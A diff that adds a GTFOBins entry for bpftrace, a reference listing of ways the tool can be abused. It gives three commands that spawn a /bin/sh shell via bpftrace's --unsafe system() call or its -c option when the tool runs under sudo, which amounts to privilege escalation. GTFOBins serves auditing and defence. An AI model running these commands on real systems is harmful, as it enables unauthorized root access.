@@ -1,0 +1,18 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/bpftrace -->
+---
+functions:
+  shell:
+  - code: |-
+      bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
+    contexts:
+      sudo:
+  - code: |-
+      echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
+      bpftrace --unsafe /path/to/temp-file
+    contexts:
+      sudo:
+  - code: |-
+      bpftrace -c /bin/sh -e 'END {exit()}'
+    contexts:
+      sudo:
+...
